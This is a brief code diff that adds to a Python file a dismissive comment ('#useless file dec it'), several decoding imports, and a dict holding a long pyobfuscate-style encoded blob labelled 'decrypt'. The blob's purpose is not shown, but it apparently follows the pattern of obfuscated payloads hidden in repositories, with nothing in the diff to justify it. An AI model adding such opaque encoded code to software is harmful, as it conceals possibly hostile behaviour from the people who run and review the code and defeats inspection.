@@ -1,3 +1,4 @@
+#useless file dec it
 import random ,base64,codecs,zlib;pyobfuscate=""
 
 obfuscate = dict(map(lambda map,dict:(map,dict),['(https://pyobfuscate.com)*(decrypt)'],['''QL|QRs`Y1<oH?0pie-`bzlN_by*Cl(Ot3NQ5S8ICIL<o;S#7Wm8ddIki|nUD?a<`Pt0roBImS9Jb`0r;fjG;r0Z1CD7$8lI8I1BzRI=~eN2#ht&_ov(vTp|8Jr45DYUqTTy6Y&$fUVwezL0bHKcp7O1W)}<Gng@>gCHw#Ahahk&!oDg$m^x@k8?iIe}U-3#ZYd##W7V5q^zGg@$dm6ae|=bORejtT%nQmcq`#3gdNgQp`HjIpb^u)sra*CH2Sg?^l|JnjCtXghDWP)ilu&(gHK0BIa|B=wnf+!;Ayv#aLn`CmWhxn=)}ipDWdsGOQuGi950Ny4ZW+Qg{b1X+^qpWT3SXvDzKf$L)89l33G$xRRZ=MsXR73vpKfx8L7g@4v-*FUY*8KWgZ<u0yr`!&s*@y0Pll2i-`L)?@Dj8R?gm`uq@@)Xt}KUC>SdY%z<;L#t;mQc@5U88;rcf@#EU;T)0g`=HfVT;QXx(AyrOne*i`}^&$vaP>dd9&eYu7fW4WIG_RI9j}xJ`_JL9_z{^D`$_6G-n1crYZA3&v(db#C_nmtb-D)WvemBi&(YwYtM-Kmx`+S2lr3J#^6JAC8f?kY!@9sN}x4z+!-G6weadeG*inYy>L+y?|i6&>Pag9P@n`zx}UeTn4^fkO}JZC*sF(UeNrAUiFSMP>db>j7*%3IHF?xOXOiv'''.replace('\n','')]))
